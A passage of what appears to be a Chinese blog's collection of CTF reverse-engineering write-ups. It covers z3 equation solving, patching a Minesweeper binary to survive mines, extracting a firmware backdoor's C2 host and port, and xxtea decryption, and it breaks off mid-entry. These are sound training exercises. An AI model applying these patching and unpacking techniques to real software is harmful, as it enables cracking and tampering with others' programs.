[2]+l[14]+l[23]-l[4]+l[3]+l[35]-l[33]-l[9]-l[20]-l[37]+l[24]-l[27]+l[36]+l[15]-l[18]-l[0]+l[12]+l[11]-l[38]+l[6]+l[22]+l[39]-l[25]-l[10]-l[19]-l[1]+l[13]-l[41]+l[30]-l[16]+l[28]-l[26]==-117)s.add(l[5]+l[37]-l[39]+l[0]-l[27]+l[12]+l[41]-l[22]+l[8]-l[16]-l[38]+l[9]+l[15]-l[35]-l[29]+l[18]+l[6]-l[25]-l[28]+l[36]+l[34]+l[32]-l[14]-l[1]+l[20]+l[40]-l[19]-l[4]-l[7]+l[26]+l[30]-l[10]+l[13]-l[21]+l[2]-l[23]-l[3]-l[33]==-252)s.add(l[29]+l[10]-l[41]-l[9]+l[12]-l[28]+l[11]+l[40]-l[27]-l[8]+l[32]-l[25]-l[23]+l[39]-l[1]-l[36]-l[15]+l[33]-l[20]+l[18]+l[22]-l[3]+l[6]-l[34]-l[21]+l[19]+l[26]+l[13]-l[4]+l[7]-l[37]+l[38]-l[2]-l[30]-l[0]-l[35]+l[5]+l[17]==-183)s.add(l[6]-l[8]-l[20]+l[34]-l[33]-l[25]-l[4]+l[3]+l[17]-l[13]-l[15]-l[40]+l[1]-l[30]-l[14]-l[28]-l[35]+l[38]-l[22]+l[2]+l[24]-l[29]+l[5]+l[9]+l[37]+l[23]-l[18]+l[19]-l[21]+l[11]+l[36]+l[41]-l[7]-l[32]+l[10]+l[26]-l[0]+l[31]==188)s.add(l[3]+l[6]-l[41]+l[10]+l[39]+l[37]+l[1]+l[8]+l[21]+l[24]+l[29]+l[12]+l[27]-l[38]+l[11]+l[23]+l[28]+l[33]-l[31]+l[14]-l[5]+l[32]-l[17]+l[40]-l[34]+l[20]-l[22]-l[16]+l[19]+l[2]-l[36]-l[7]+l[18]+l[15]+l[26]-l[0]-l[4]+l[35]==1036)s.add(l[28]-l[33]+l[2]+l[37]-l[12]-l[9]-l[39]+l[16]-l[32]+l[8]-l[36]+l[31]+l[10]-l[4]+l[21]-l[25]+l[18]+l[24]-l[0]+l[29]-l[26]+l[35]-l[22]-l[41]-l[6]+l[15]+l[19]+l[40]+l[7]+l[34]+l[17]-l[3]-l[13]+l[5]+l[23]+l[11]-l[27]+l[1]==328)s.add(l[22]-l[32]+l[17]-l[9]+l[20]-l[18]-l[34]+l[23]+l[36]-l[35]-l[38]+l[27]+l[4]-l[5]-l[41]+l[29]+l[33]+l[0]-l[37]+l[28]-l[40]-l[11]-l[12]+l[7]+l[1]+l[2]-l[26]-l[16]-l[8]+l[24]-l[25]+l[3]-l[6]-l[19]-l[39]-l[14]-l[31]+l[10]==-196)s.add(l[11]+l[13]+l[14]-l[15]-l[29]-l[2]+l[7]+l[20]+l[30]-l[36]-l[33]-l[19]+l[31]+l[0]-l[39]-l[4]-l[6]+l[38]+l[35]-l[28]+l[34]-l[9]-l[23]-l[26]+l[37]-l[8]-l[27]+l[5]-l[41]+l[3]+l[17]+l[40]-l[10]+l[25]+l[12]-l[24]+l[18]+l[32]==7)s.add(l[34]-l[37]-l[40]+l[4]-l[22]-l[31]-l[6]+l[38]+l[13]-l[28]+l[8]+l[30]-l[20]-l[7]-l[32]+l[26]+l[1]-l[18]+l[5]+l[35]-l[24]-l[41]+l[9]-l[0]-l[2]-l[15]-l[10]+l[12]-l[36]+l[33]-l[16]-l[14]-l[25]-l[29]-l[21]+l[27]+l[3]-l[17]==-945)s.add(l[12]-l[30]-l[8]+l[20]-l[2]-l[36]-l[25]-l[0]-l[19]-l[28]-l[7]-l[11]-l[33]+l[4]-l[23]+l[10]-l[41]+l[39]-l[32]+l[27]+l[18]+l[15]+l[34]+l[13]-l[40]+l[29]-l[6]+l[37]-l[14]-l[16]+l[38]-l[26]+l[17]+l[31]-l[22]-l[35]+l[5]-l[1]==-480)s.add(l[36]-l[11]-l[34]+l[8]+l[0]+l[15]+l[28]-l[39]-l[32]-l[2]-l[27]+l[22]+l[16]-l[30]-l[3]+l[31]-l[26]+l[20]+l[17]-l[29]-l[18]+l[19]-l[10]+l[6]-l[5]-l[38]-l[25]-l[24]+l[4]+l[23]+l[9]+l[14]+l[21]-l[37]+l[13]-l[41]-l[12]+l[35]==-213)s.add(l[19]-l[36]-l[12]+l[33]-l[27]-l[37]-l[25]+l[38]+l[16]-l[18]+l[22]-l[39]+l[13]-l[7]-l[31]-l[26]+l[15]-l[10]-l[9]-l[2]-l[30]-l[11]+l[41]-l[4]+l[24]+l[34]+l[5]+l[17]+l[14]+l[6]+l[8]-l[21]-l[23]+l[32]-l[1]-l[29]-l[0]+l[3]==-386)s.add(l[0]+l[7]-l[28]-l[38]+l[19]+l[31]-l[5]+l[24]-l[3]+l[33]-l[12]-l[29]+l[32]+l[1]-l[34]-l[9]-l[25]+l[26]-l[8]+l[4]-l[10]+l[40]-l[15]-l[11]-l[27]+l[36]+l[14]+l[41]-l[35]-l[13]-l[17]-l[21]-l[18]+l[39]-l[2]+l[20]-l[23]-l[22]==-349)s.add(l[10]+l[22]+l[21]-l[0]+l[15]-l[6]+l[20]-l[29]-l[30]-l[33]+l[19]+l[23]-l[28]+l[41]-l[27]-l[12]-l[37]-l[32]+l[34]-l[36]+l[3]+l[1]-l[13]+l[18]+l[14]+l[9]+l[7]-l[39]+l[8]+l[2]-l[31]-l[5]-l[40]+l[38]-l[26]-l[4]+l[16]-l[25]==98)s.add(l[28]+l[38]+l[20]+l[0]-l[5]-l[34]-l[41]+l[22]-l[26]+l[11]+l[29]+l[31]-l[3]-l[16]+l[23]+l[17]-l[18]+l[9]-l[4]-l[12]-l[19]-l[40]-l[27]+l[33]+l[8]-l[37]+l[2]+l[15]-l[24]-l[39]+l[10]+l[35]-l[1]+l[30]-l[36]-l[25]-l[14]-l[32]==-412)s.add(l[1]-l[24]-l[29]+l[39]+l[41]+l[0]+l[9]-l[19]+l[6]-l[37]-l[22]+l[32]+l[21]+l[28]+l[36]+l[4]-l[17]+l[20]-l[13]-l[35]-l[5]+l[33]-l[27]-l[30]+l[40]+l[25]-l[18]+l[34]-l[3]-l[10]-l[16]-l[23]-l[38]+l[8]-l[14]-l[11]-l[7]+l[12]==-95)s.add(l[2]-l[24]+l[31]+l[0]+l[9]-l[6]+l[7]-l[1]-l[22]+l[8]-l[23]+l[40]+l[20]-l[38]-l[11]-l[14]+l[18]-l[36]+l[15]-l[4]-l[41]-l[12]-l[34]+l[32]-l[35]+l[17]-l[21]-l[10]-l[29]+l[39]-l[16]+l[27]+l[26]-l[3]-l[5]+l[13]+l[25]-l[28]==-379)s.add(l[19]-l[17]+l[31]+l[14]+l[6]-l[12]+l[16]-l[8]+l[27]-l[13]+l[41]+l[2]-l[7]+l[32]+l[1]+l[25]-l[9]+l[37]+l[34]-l[18]-l[40]-l[11]-l[10]+l[38]+l[21]+l[3]-l[0]+l[24]+l[15]+l[23]-l[20]+l[26]+l[22]-l[4]-l[28]-l[5]+l[39]+l[35]==861)s.add(l[35]+l[36]-l[16]-l[26]-l[31]+l[0]+l[21]-l[13]+l[14]+l[39]+l[7]+l[4]+l[34]+l[38]+l[17]+l[22]+l[32]+l[5]+l[15]+l[8]-l[29]+l[40]+l[24]+l[6]+l[30]-l[2]+l[25]+l[23]+l[1]+l[12]+l[9]-l[10]-l[3]-l[19]+l[20]-l[37]-l[33]-l[18]==1169)s.add(l[13]+l[0]-l[25]-l[32]-l[21]-l[34]-l[14]-l[9]-l[8]-l[15]-l[16]+l[38]-l[35]-l[30]-l[40]-l[12]+l[3]-l[19]+l[4]-l[41]+l[2]-l[36]+l[37]+l[17]-l[1]+l[26]-l[39]-l[10]-l[33]+l[5]-l[27]-l[23]-l[24]-l[7]+l[31]-l[28]-l[18]+l[6]==-1236)s.add(l[20]+l[27]-l[29]-l[25]-l[3]+l[28]-l[32]-l[11]+l[10]+l[31]+l[16]+l[21]-l[7]+l[4]-l[24]-l[35]+l[26]+l[12]-l[37]+l[6]+l[23]+l[41]-l[39]-l[38]+l[40]-l[36]+l[8]-l[9]-l[5]-l[1]-l[13]-l[14]+l[19]+l[0]-l[34]-l[15]+l[17]+l[22]==-114)s.add(l[12]-l[28]-l[13]-l[23]-l[33]+l[18]+l[10]+l[11]+l[2]-l[36]+l[41]-l[16]+l[39]+l[34]+l[32]+l[37]-l[38]+l[20]+l[6]+l[7]+l[31]+l[5]+l[22]-l[4]-l[15]-l[24]+l[17]-l[3]+l[1]-l[35]-l[9]+l[30]+l[25]-l[0]-l[8]-l[14]+l[26]+l[21]==659)s.add(l[21]-l[3]+l[7]-l[27]+l[0]-l[32]-l[24]-l[37]+l[4]-l[22]+l[20]-l[5]-l[30]-l[31]-l[1]+l[15]+l[41]+l[12]+l[40]+l[38]-l[17]-l[39]+l[19]-l[13]+l[23]+l[18]-l[2]+l[6]-l[33]-l[9]+l[28]+l[8]-l[16]-l[10]-l[14]+l[34]+l[35]-l[11]==-430)s.add(l[11]-l[23]-l[9]-l[19]+l[17]+l[38]-l[36]-l[22]-l[10]+l[27]-l[14]-l[4]+l[5]+l[31]+l[2]+l[0]-l[16]-l[8]-l[28]+l[3]+l[40]+l[25]-l[33]+l[13]-l[32]-l[35]+l[26]-l[20]-l[41]-l[30]-l[12]-l[7]+l[37]-l[39]+l[15]+l[18]-l[29]-l[21]==-513)s.add(l[32]+l[19]+l[4]-l[13]-l[17]-l[30]+l[5]-l[33]-l[37]-l[15]-l[18]+l[7]+l[25]-l[14]+l[35]+l[40]+l[16]+l[1]+l[2]+l[26]-l[3]-l[39]-l[22]+l[23]-l[36]-l[27]-l[9]+l[6]-l[41]-l[0]-l[31]-l[20]+l[12]-l[8]+l[29]-l[11]-l[34]+l[21]==-502)s.add(l[30]-l[31]-l[36]+l[3]+l[9]-l[40]-l[33]+l[25]+l[39]-l[26]+l[23]-l[0]-l[29]-l[32]-l[4]+l[37]+l[28]+l[21]+l[17]+l[2]+l[24]+l[6]+l[5]+l[8]+l[16]+l[27]+l[19]+l[12]+l[20]+l[41]-l[22]+l[15]-l[11]+l[34]-l[18]-l[38]+l[1]-l[14]==853)s.add(l[38]-l[10]+l[16]+l[8]+l[21]-l[25]+l[36]-l[30]+l[31]-l[3]+l[5]-l[15]+l[23]-l[28]+l[7]+l[12]-l[29]+l[22]-l[0]-l[37]-l[14]-l[11]+l[32]+l[33]-l[9]+l[39]+l[41]-l[19]-l[1]+l[18]-l[4]-l[6]+l[13]+l[20]-l[2]-l[35]-l[26]+l[27]==-28)s.add(l[11]+l[18]-l[26]+l[15]-l[14]-l[33]+l[7]-l[23]-l[25]+l[0]-l[6]-l[21]-l[16]+l[17]-l[19]-l[28]-l[38]-l[37]+l[9]+l[20]-l[8]-l[3]+l[22]-l[35]-l[10]-l[31]-l[2]+l[41]-l[1]-l[4]+l[24]-l[34]+l[39]+l[40]+l[32]-l[5]+l[36]-l[27]==-529)s.add(l[38]+l[8]+l[36]+l[35]-l[23]-l[34]+l[13]-l[4]-l[27]-l[24]+l[26]+l[31]-l[30]-l[5]-l[40]+l[28]-l[11]-l[2]-l[39]+l[15]+l[10]-l[17]+l[3]+l[19]+l[22]+l[33]+l[0]+l[37]+l[16]-l[9]-l[32]+l[25]-l[21]-l[12]+l[6]-l[41]+l[20]-l[18]==-12)s.add(l[6]-l[30]-l[20]-l[27]-l[14]-l[39]+l[41]-l[33]-l[0]+l[25]-l[32]-l[3]+l[26]-l[12]+l[8]-l[35]-l[24]+l[15]+l[9]-l[4]+l[13]+l[36]+l[34]+l[1]-l[28]-l[21]+l[18]+l[23]+l[29]-l[10]-l[38]+l[22]+l[37]+l[5]+l[19]+l[7]+l[16]-l[31]==81)check=s.check()print(check)model = s.model()print(model)for i in range(42): print(chr(int(&quot;%s&quot;%(model[l[i]]))),end=&#x27;&#x27;) 得到 flag {A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3}","tags":["reverse"],"categories":["wp"]},{"title":"UltimateMinesweeper","path":"/2022/07/05/UltimateMinesweeper/","content":"这是个游戏题，打开之后就是个扫雷，估计是排完雷就可以显示 flag 了，然后用 dnSpy 打开文件之后，感觉这个 GetKey 是关键函数，因为出现了一个数组，这里估计就是 flag 了，而且肯定有一些算法在里面，感觉可以通过脚本逆向出来（做完之后看别人的 wp 原来这里也无法用脚本逆出来，因为少了一个数组的数据） 但是在查壳的时候知道了这个程序使用 C# 写的，是在看不太懂，最多分析个大概的思路，就只能去猜它的意思，所以还是换个思路，就改一下里面的代码，看能不能强制通关之类的，然后我看到了这个函数 这里引用了 GetKey 函数，肯定是个关键点，而且这个 if 语句里面包含了 Application.Exit () 函数，这是用来退出程序的函数，估计就是不符合条件了也就是踩雷了就退出程序，所以我就把这两个 if 语句全删掉了，然后再编译并另存为新的程序，发现真的踩雷也不会挂了，所以就一直无敌 但是这个真的好难点，我一开始点的时候点累了，感觉有更好的方法，点到一半就关掉了，白点了那么多下好烦啊（后面看别人的 wp 的时候发现居然有人可以开透视挂，简直不要太爽，比无敌挂好用多了，不用点那么多下） 但是后来实在是想不出别的方法了（论精通各种编程语言的重要性，如果能看懂 C# 肯定会好做些），就还是老实地全点完了，刚点完发现给的答案是个乱码 到原来那个没被修改过的程序找到相应的位置才是真的 flag 得到 flag {Ch3aters_Alw4ys_W1n@flare-on.com}","tags":["reverse"],"categories":["wp"]},{"title":"firmware","path":"/2022/07/05/firmware/","content":"这个题刚开始就提示了我们要分析后门程序的服务器和端口，所以我们的目的就是要去找到后门程序，并且拿到服务器和端口，最后再 md5 加密一下就是我们的 flag 了。 在拿到题目之后，发现是个 bin 文件，上网查了一下，要用 binwalk 工具去提取里面的文件， 提取之后发现前面几个文件打开之后什么都没有，也没有所谓的后门文件，就剩一个 120200.squashfs 文件，这个东西我怎么都打不开，然后查了一下，原来它要用 firmware-mod-kit 来解压，才能提取里面的文件，把工具装好之后，解压，然后终于找到了一个 backdoor 文件，这应该就是后门文件了 然后检查一下这个后门程序，发现还有个 upx 的壳，那我们就脱壳 脱壳之后用 ida 打开，shift+F12 搜索字符串，看到一个网址 这应该就是 flag 的前一部分了，而剩下的端口应该就是一串数字了，找了一会在这里发现一段可疑代码 18 行 - 23 行是关键代码，根据题目给的提示，flag 加密前的形式是 (网址：端口) 的格式，而这里刚好出现了冒号，并且将冒号后面的数据整型化后赋给 v3，所以就是端口的值，这里的话 v3=36667 应该就是它默认的端口值，所以 36667 就是我们需要的端口，和前面的网址连起来就是 echo.byethost51.com:36667，MD5 一下就是我们的 flag 了 得到 flag {33a422c45d551ac6e4756f59812a954b}","tags":["reverse"],"categories":["wp"]},{"title":"MRCTF2020-PixelShooter","path":"/2022/07/03/MRCTF2020-PixelShooter/","content":"这是一道安卓逆向，而且是一个游戏题，可以用模拟器打开玩通关，不过一开始我还是习惯性地用 android killer 打开看 java 代码，一直找不到关键函数，然后突然想起之前做过类似的题目，这种游戏题一般是基于 unity 开发的，而且它的核心逻辑位于 assets\\bin\\Data\\Managed\\Assembly-CSharp.dll，所以我把它里面的 Assembly-CSharp.dll 文件提取出来之后，再用 dnSpy 打开，然后找到它的关键函数，但没想到的是 flag 直接就可以看到… 后面又在网上搜了一下这道题，发现还有一个工具也就是 JEB 可以来做这类题，然后我就下了一个试试 个人感觉 dnSpy 更好用哈哈哈哈 flag：MRCTF{Unity_1S_Fun_233}","tags":["reverse"],"categories":["wp"]},{"title":"GXYCTF2019-simpleCPP","path":"/2022/07/02/GXYCTF2019-simpleCPP/","content":"# 主函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196int __cdecl main(int argc, const char **argv, const char **envp)&#123; bool v3; // si __int64 *v4; // rax unsigned __int8 *v5; // rax unsigned __int8 *v6; // rbx int v7; // er10 __int64 v8; // r11 void **v9; // r9 void **v10; // r8 __int64 v11; // rdi __int64 v12; // r15 __int64 v13; // r12 __int64 v14; // rbp int v15; // ecx unsigned __int8 *v16; // rdx __int64 v17; // rdi __int64 *v18; // r14 __int64 v19; // rbp __int64 v20; // r13 __int64 *v21; // rdi __int64 v22; // r12 __int64 v23; // r15 __int64 v24; // rbp __int64 v25; // rdx __int64 v26; // rbp __int64 v27; // rbp __int64 v28; // r10 __int64 v29; // rdi __int64 v30; // r8 bool v31; // dl __int64 *v32; // rax void **v33; // rdx __int64 *v34; // rax __int64 *v35; // rax void *v36; // rcx __int64 v38; // [rsp+20h] [rbp-68h] void *Block[2]; // [rsp+30h] [rbp-58h] BYREF unsigned __int64 v40; // [rsp+40h] [rbp-48h] unsigned __int64 v41; // [rsp+48h] [rbp-40h] v3 = 0; v40 = 0i64; v41 = 15i64; LOBYTE(Block[0]) = 0; v4 = sub_7FF793A919C0(std::cout, &quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;); std::ostream::operator&lt;&lt;(v4, sub_7FF793A91B90); sub_7FF793A919C0(std::cout, &quot;Let&#x27;s start our game,Please input your flag:&quot;); sub_7FF793A91DE0(std::cin, Block); std::ostream::operator&lt;&lt;(std::cout, sub_7FF793A91B90); if ( v40 - 5 &gt; 25 ) &#123; v35 = sub_7FF793A919C0(std::cout, &quot;Wrong input ,no GXY&#123;&#125; in input words&quot;); std::ostream::operator&lt;&lt;(v35, sub_7FF793A91B90); goto LABEL_43; &#125; v5 = operator new(32ui64); v6 = v5; if ( v5 ) &#123; *v5 = 0i64; *(v5 + 1) = 0i64; *(v5 + 2) = 0i64; *(v5 + 3) = 0i64; &#125; else &#123; v6 = 0i64; &#125; v7 = 0; if ( v40 ) &#123; v8 = 0i64; do &#123; v9 = Block; if ( v41 &gt;= 16 ) v9 = Block[0]; v10 = &amp;qword_7FF793A96048; if ( qword_7FF793A96060 &gt;= 16 ) v10 = qword_7FF793A96048; v6[v8] = *(v9 + v8) ^ *(v10 + v7 % 27); ++v7; ++v8; &#125; while ( v7 &lt; v40 ); &#125; v11 = 0i64; v12 = 0i64; v13 = 0i64; v14 = 0i64; if ( v40 &gt; 30 ) goto LABEL_27; v15 = 0; if ( v40 &lt;= 0 ) goto LABEL_27; v16 = v6; do &#123; v17 = *v16 + v11; ++v15; ++v16; switch ( v15 ) &#123; case 8: v14 = v17; goto LABEL_23; case 16: v13 = v17; goto LABEL_23; case 24: v12 = v17;LABEL_23: v17 = 0i64; break; case 32: sub_7FF793A919C0(std::cout, &quot;ERRO,out of range&quot;); exit(1); &#125; v11 = v17 &lt;&lt; 8; &#125; while ( v15 &lt; v40 ); if ( v14 ) &#123; v18 = operator new(0x20ui64); *v18 = v14; v18[1] = v13; v18[2] = v12; v18[3] = v11; goto LABEL_28; &#125;LABEL_27: v18 = 0i64;LABEL_28: v38 = v18[2]; v19 = v18[1]; v20 = *v18; v21 = operator new(0x20ui64); if ( IsDebuggerPresent() ) &#123; sub_7FF793A919C0(std::cout, &quot;Hi , DO not debug me !&quot;); Sleep(0x7D0u); exit(0); &#125; v22 = v19 &amp; v20; *v21 = v19 &amp; v20; v23 = v38 &amp; ~v20; v21[1] = v23; v24 = ~v19; v25 = v38 &amp; v24; v21[2] = v38 &amp; v24; v26 = v20 &amp; v24; v21[3] = v26; if ( v23 != 0x11204161012i64 ) &#123; v21[1] = 0i64; v23 = 0i64; &#125; v27 = v23 | v22 | v25 | v26; v28 = v18[1]; v29 = v18[2]; v30 = v25 &amp; *v18 | v29 &amp; (v22 | v28 &amp; ~*v18 | ~(v28 | *v18)); v31 = 0; if ( v30 == 0x8020717153E3013i64 ) v31 = v27 == 0x3E3A4717373E7F1Fi64; if ( (v27 ^ v18[3]) == 0x3E3A4717050F791Fi64 ) v3 = v31; if ( (v23 | v22 | v28 &amp; v29) == (~*v18 &amp; v29 | 0xC00020130082C0Ci64) &amp;&amp; v3 ) &#123; v32 = sub_7FF793A919C0(std::cout, &quot;Congratulations!flag is GXY&#123;&quot;); v33 = Block; if ( v41 &gt;= 0x10 ) v33 = Block[0]; v34 = sub_7FF793A91FD0(v32, v33, v40); sub_7FF793A919C0(v34, &quot;&#125;&quot;); j_j_free(v6); &#125; else &#123; sub_7FF793A919C0(std::cout, &quot;Wrong answer!try again&quot;); j_j_free(v6); &#125;LABEL_43: if ( v41 &gt;= 0x10 ) &#123; v36 = Block[0]; if ( v41 + 1 &gt;= 0x1000 ) &#123; v36 = *(Block[0] - 1); if ( (Block[0] - v36 - 8) &gt; 0x1F ) invalid_parameter_noinfo_noreturn(); &#125; j_j_free(v36); &#125; return 0;&#125; 通过 48-49 行可以知道，输入的 flag 就是 block，然后在 76 行，block 被复制给了 v9，又在 82 行和 v10 也就是 qword_7FF793A96048 进行了一次异或，qword_7FF793A96048 点进去发现是 0，觉得不对，然后右键它点击 jump to xref，可以发现是有对它赋值的 所以 qword_7FF793A96048 就是 “i_will_check_is_debug_or_not” 这个字符串，并且输入的 flag 会和它进行一次异或，所以我们现在要知道的就是这个计算的结果，然后逆运算得出 flag 了。我们继续往下看，发现 v6=v16，v16=v17，v17=v11，v11 又等于 v18 [3]，在 120 行 v11 = v17 &lt;&lt; 8，这里对 v17 进行了位移八位，进行了一个堆叠，所以 v6 就相当于整个 v18 串起来。 再往下看，168 行有一个 if 语句，条件通过就会通过程序，说明这就是最后的判断条件了，而且判断条件中涉及到了 v18 数组，再看看 145-167 行，这里全是一些赋值语句，最后赋的值也是写出来了的，这些最后全都可以用 v18 [0],v18 [1],v18 [2],v18 [3] 来表示，也就可以组成一个多元一次方程组，求解这个方程组可以用 python 的 z3 模块来求解，通过这样就可以得到 v18 的值了，这样就可以通过异或得到 flag，所以我们现在要做的就是理清这个方程组并解出来，脚本如下 1234567891011121314151617181920 from z3 import *x,y,z,w=BitVecs(&#x27;x y z w&#x27;,64)s=Solver()s.add((~x)&amp;z==1176889593874)s.add(((z&amp;~x)|(x&amp;y)|(z&amp;(~y))|(x&amp;(~y)))^w==4483974543195470111)s.add(((z&amp;~y)&amp;x|z&amp;((x&amp;y)|y&amp;~x|~(y|x)))==577031497978884115)s.add(((z&amp;~x)|(x&amp;y)|(z&amp;~y)|(x&amp;~y))==4483974544037412639)s.add(((z&amp;(~x)) | (x&amp;y) | y &amp; z) == (((~x)&amp; z)|864693332579200012))s.check()m = s.model()print(m)for i in m: print(&quot;%s = 0x%x&quot;%(i,m[i].as_long())) z3 模块如何使用可以参考这个博客：python z3 库学习_小龙在山东的博客 - CSDN 博客_python z3 库 结果如下： y = 0xc00020130082c0c x = 0x3e3a460533286f0d w = 0x32310600 z = 0x8020717153e3013 有了 v18 之后，我们就可以解 flag 了，脚本如下 123456789a = &quot;i_will_check_is_debug_or_not&quot;b =[0x3E,0x3A,0x46,0x05,0x33,0x28,0x6F,0x0D,0x8C,0x00,0x8A,0x09,0x78,0x49, 0x2C,0xAC,0x08,0x02,0x07,0x17,0x15,0x3E,0x30,0x13,0x32,0x31,0x06]c = &#x27;&#x27;for i in range(len(b)): c += chr(ord(a[i]) ^ b[i])print(c) 的出来的结果是 &quot;We1l_D0näeéb’ _ólgebra_am_i&quot;，这肯定是不对的，然后在网上看了别人的博客，说是这道题在比赛的时候给出来了中间的部分为 &quot;e!P0or_a&quot; 所以最后的 flag 为：flag{We1l_D0ne!P0or_algebra_am_i}","tags":["reverse"],"categories":["wp"]},{"title":"2019红帽杯xx","path":"/2022/07/01/2019红帽杯xx/","content":"这道题的前面一部分我分析不是很清楚，参考了其他大佬的博客才能理解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rbx __int64 v4; // rax __int128 *v5; // rax __int64 v6; // r11 __int128 *v7; // r14 int v8; // edi __int128 *v9; // rsi char v10; // r10 int v11; // edx __int64 v12; // r8 unsigned __int64 v13; // rcx __int64 v14; // rcx unsigned __int64 v15; // rax unsigned __int64 i; // rax __int64 v17; // rax size_t v18; // rsi _BYTE *v19; // rbx _BYTE *v20; // r9 int v21; // er11 char *v22; // r8 __int64 v23; // rcx char v24; // al __int64 v25; // r9 __int64 v26; // rdx __int64 v27; // rax size_t Size; // [rsp+20h] [rbp-48h] BYREF __int128 v30; // [rsp+28h] [rbp-40h] BYREF int v31; // [rsp+38h] [rbp-30h] int v32; // [rsp+3Ch] [rbp-2Ch] int Code[4]; // [rsp+40h] [rbp-28h] BYREF int v34; // [rsp+50h] [rbp-18h] *Code = 0i64; v34 = 0; sub_1400018C0(std::cin, argv, Code); v3 = -1i64; v4 = -1i64; do ++v4; while ( *(Code + v4) ); if ( v4 != 19 ) &#123; sub_140001620(std::cout, &quot;error &quot;); _exit(Code); &#125; v5 = operator new(5ui64); v6 = *&amp;::Code; v7 = v5; v8 = 0; v9 = v5; do &#123; v10 = *(v9 + Code - v5); v11 = 0; *v9 = v10; v12 = 0i64; v13 = -1i64; do ++v13; while ( *(v6 + v13) ); if ( v13 ) &#123; do &#123; if ( v10 == *(v6 + v12) ) break; ++v11; ++v12; &#125; while ( v11 &lt; v13 ); &#125; v14 = -1i64; do ++v14; while ( *(v6 + v14) ); if ( v11 == v14 ) _exit(v6); v9 = (v9 + 1); &#125; while ( v9 - v5 &lt; 4 ); *(v5 + 4) = 0; do ++v3; while ( *(Code + v3) ); v15 = 0i64; v30 = *v7; while ( *(&amp;v30 + v15) ) &#123; if ( !*(&amp;v30 + v15 + 1) ) &#123; ++v15; break; &#125; if ( !*(&amp;v30 + v15 + 2) ) &#123; v15 += 2i64; break; &#125; if ( !*(&amp;v30 + v15 + 3) ) &#123; v15 += 3i64; break; &#125; v15 += 4i64; if ( v15 &gt;= 16 ) break; &#125; for ( i = v15 + 1; i &lt; 0x10; ++i ) *(&amp;v30 + i) = 0; v17 = sub_140001AB0(Code, v3, &amp;v30, &amp;Size); v18 = Size; v19 = v17; v20 = operator new(Size); v21 = 1; *v20 = v19[2]; v22 = v20 + 1; v20[1] = *v19; v20[2] = v19[3]; v20[3] = v19[1]; v20[4] = v19[6]; v20[5] = v19[4]; v20[6] = v19[7]; v20[7] = v19[5]; v20[8] = v19[10]; v20[9] = v19[8]; v20[10] = v19[11]; v20[11] = v19[9]; v20[12] = v19[14]; v20[13] = v19[12]; v20[14] = v19[15]; v20[15] = v19[13]; v20[16] = v19[18]; v20[17] = v19[16]; v20[18] = v19[19]; v20[19] = v19[17]; v20[20] = v19[22]; v20[21] = v19[20]; v20[22] = v19[23]; for ( v20[23] = v19[21]; v21 &lt; v18; ++v22 ) &#123; v23 = 0i64; if ( v21 / 3 &gt; 0 ) &#123; v24 = *v22; do &#123; v24 ^= v20[v23++]; *v22 = v24; &#125; while ( v23 &lt; v21 / 3 ); &#125; ++v21; &#125; *&amp;v30 = 0xC0953A7C6B40BCCEui64; v25 = v20 - &amp;v30; *(&amp;v30 + 1) = 0x3502F79120209BEFi64; v26 = 0i64; v31 = 0xC8021823; v32 = 0xFA5656E7; do &#123; if ( *(&amp;v30 + v26) != *(&amp;v30 + v26 + v25) ) _exit(v8 * v8); ++v8; ++v26; &#125; while ( v26 &lt; 24 ); v27 = sub_140001620(std::cout, &quot;You win!&quot;); std::ostream::operator&lt;&lt;(v27, sub_1400017F0); return 0;&#125; 用 findcrypt 看了一下，sub_140001AB0 这个函数是 xxtea 加密，然后在加密之后，后面对加密后的 flag 乱了一下顺序，再每 3 个数据位一组，进行了一些异或操作 至于前面一部分的操作，大佬的博客是这样说的 判断输入的字符串的每个字符是否包含在 &quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot; 中 取输入字符串的前 4 位字符，即 &quot;flag&quot;，扩展为 16 位，作为 xxtea 加密的秘钥 key 其中的 flag 扩展为 16 位，就只要在右端补 0 就可以了 由最后的 if 条件可知，v30，v30+1，v31，v32 就是最后的结果，这里要注意一下小端序的问题，要反过来写 1234567891011121314151617181920212223242526import xxtearesult = &#x27;CE BC 40 6B 7C 3A 95 C0 EF 9B 20 20 91 F7 02 35 23 18 02 C8 E7 56 56 FA&#x27;.split(&quot; &quot;)res = [int(i,16) for i in result]for i in range(7,-1,-1): t = 0 for n in range(0,i): if t == 0: t = res[0] else: t ^= res[n] for j in range(3): res[i*3+j] ^= tbox = [1,3,0,2,5,7,4,6,9,11,8,10,13,15,12,14,17,19,16,18,21,23,20,22]m = []for i in range(len(box)): m.append(res[box[i]])print(m)key = &#x27;flag&#x27;+&#x27;\\x00&#x27;*12print(xxtea.decrypt(bytes(m),key,padding=False)) 得到 flag：flag","tags":["reverse"],"categories":["wp"]},{"title":"nostringattached","path":"/2022/05/14/nostringattached/","content":"这是一个 32 为 ELF 文件，用 ida 打开之后，发现没有什么明显的字符串出现，那么看到主函数 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; setlocale(6, &amp;locale); banner(); prompt_authentication(); authenticate(); return 0;&#125; 表面上没有什么值得注意的，经过检查后发现 authenticate 才是关键函数 # authenticate 函数 12345678910111213141516void authenticate()&#123; wchar_t ws[8192]; // [esp+1Ch] [ebp-800Ch] BYREF wchar_t *s2; // [esp+801Ch] [ebp-Ch] s2 = decrypt(&amp;s, &amp;dword_8048A90); if ( fgetws(ws, 8192, stdin) ) &#123; ws[wcslen(ws) - 1] = 0; if ( !wcscmp(ws, s2) ) wprintf(&amp;unk_8048B44); else wprintf(&amp;unk_8048BA4); &#125; free(s2);&#125; 其中 ws 是输入的 flag，输入的 flag 等于 s2 则输出 &amp; unk_8048B44 这个字符串，点开之后得知就是 Success，也就是正确，所以 s2 就是 